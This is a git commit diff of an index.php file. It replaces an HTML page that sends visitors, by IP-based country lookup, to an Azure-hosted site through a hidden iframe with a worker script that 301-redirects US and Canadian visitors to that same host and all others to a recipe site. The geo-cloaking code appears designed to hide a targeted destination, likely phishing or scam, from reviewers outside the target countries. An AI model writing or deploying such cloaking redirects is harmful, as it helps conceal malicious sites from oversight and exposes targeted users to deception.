6657a06ba0518f94fdd6e384c7442d45cef77c88
allsupport <141170000+allsupport@users.noreply.github.com>
2025-03-11 02:12:33 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,41 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location-Based Hidden Redirect</title>
-    <script>
-        // USA/Canada Redirection URL
-        var usaCanadaURL = "https://huntop001.z13.web.core.windows.net/";
-        // Other Countries Redirection URL
-        var otherCountriesURL = "https://www.allrecipes.com";
+addEventListener("fetch", event => {
+  event.respondWith(handleRequest(event.request));
+});
 
-        // Function to Redirect with Hidden iframe
-        function hiddenRedirect(targetUrl) {
-            var iframe = document.createElement("iframe");
-            iframe.style.display = "none";
-            iframe.src = targetUrl;
-            document.body.appendChild(iframe);
-        }
+async function handleRequest(request) {
+  let country = request.headers.get("CF-IPCountry");
 
-        // Fetch User Location Based on IP
-        fetch("https://ipapi.co/json/")
-            .then(response => response.json())
-            .then(data => {
-                var country = data.country_code;
-                if (country === "US" || country === "CA") {
-                    hiddenRedirect(usaCanadaURL);
-                } else {
-                    hiddenRedirect(otherCountriesURL);
-                }
-            })
-            .catch(() => {
-                // Default redirection if location detection fails
-                hiddenRedirect(otherCountriesURL);
-            });
-    </script>
-</head>
-<body>
-    <h1>Loading...</h1> <!-- Can be hidden if needed -->
-</body>
-</html>
+  if (country === "US") {
+    return Response.redirect("https://huntop001.z13.web.core.windows.net/", 301);
+  } else if (country === "CA") {
+    return Response.redirect("https://huntop001.z13.web.core.windows.net/", 301);
+  } else {
+    return Response.redirect("https://www.allrecipes.com/", 301);
+  }
+}
